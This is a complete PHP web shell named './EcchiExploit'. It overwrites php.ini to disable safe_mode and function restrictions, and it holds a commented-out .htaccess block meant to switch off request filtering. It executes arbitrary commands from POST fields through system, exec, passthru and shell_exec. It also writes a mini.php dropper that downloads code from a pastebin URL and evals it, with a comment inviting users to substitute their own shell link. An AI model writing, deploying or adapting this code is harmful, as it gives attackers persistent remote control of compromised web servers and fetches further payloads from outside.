<?php
ini_set('display_error', 1);
ini_set('display_startup_errors', 1);
ini_set('max_execution_time', 0);
ini_set('output_buffering', 0);
set_time_limit(0);
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="description" content="Simple POST Data Execution Command">
    <title>./EcchiExploit</title>
</head>

<body>
    <?php

    /* Bypass Disable Function With php.ini And .htaccess */

    /* php.ini */

    $ini = fopen('php.ini', 'w');
    fwrite($ini, "safe_mode=off\ndisable_function=none");
    fclose($ini);

    /* htaccess */

    // $hta = fopen('.htaccess', 'w');
    // fwrite($hta, "SecFilterEngine Off\nSecFilterScanPOST Off");
    // fclose($hta);

    /* Execution With Post Request  */

    if (isset($_POST['hidden']) == 'cmd') {
        /* Command With Function System */
        system($_POST['sys']);

        /* Command With Function Exec */
        exec($_POST['exe']);

        /* Command With Function Passthru */
        passthru($_POST['pst']);

        /* Command With Function Shell_Exec */
        shell_exec($_POST['sh']);
    }

    if (isset($_POST['shell']) == 'upload') {
    ?>
        <a href="mini.php">here</a>
    <?php
        if (file_exists("mini.php")) {
        } else {
            $hmm = fopen('mini.php', 'w');
            $p = '<?php eval("?>".file_get_contents("https://pastebin.com/raw/ZyfBjcqJ"));?>'; //Jika Kalian Ingin Menggantinya, Ganti Linknya Dengan Link Shell Kalian
            fwrite($hmm, $p);
            fclose($hmm);
        }
    }
    ?>
</body>

</html>